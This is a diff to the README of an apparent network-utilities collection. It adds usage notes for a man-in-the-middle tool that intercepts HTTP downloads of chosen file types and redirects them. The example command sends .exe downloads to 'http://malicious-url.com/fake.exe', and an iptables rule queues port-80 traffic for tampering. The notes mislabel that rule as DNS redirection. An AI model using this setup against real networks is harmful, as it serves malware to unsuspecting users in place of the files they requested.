@@ -97,6 +97,41 @@ Clear iptables after use
 ```bash
 sudo iptables --flush
 ```
+### 6. File Download Interception Tool
+
+#### Description
+This tool intercepts HTTP requests for specific file types (e.g., `.exe`, `.pdf`) and redirects the download to a specified location using Scapy and NetfilterQueue.
+
+#### Usage
+Run the tool using the following command:
+
+```bash
+sudo python3 file_intercept.py -f <file_type> -d <redirect_url>
+ ```
+#### Example:
+```bash
+sudo python3 file_intercept.py -f .exe -d http://malicious-url.com/fake.exe
+```
+#### Install dependencies:
+```bash
+pip install netfilterqueue
+```
+#### Notes
+Use iptables to redirect DNS requests to the Netfilter queue:
+```bash
+sudo iptables -I FORWARD -p tcp --dport 80 -j NFQUEUE --queue-num 0
+```
+Clear iptables after use
+```bash
+sudo iptables --flush
+```
+
+
+
+
+
+
+
 ## Conclusion
 This collection of network utilities provides essential tools for network analysis and security testing. Use them responsibly and in accordance with legal and ethical guidelines.
 
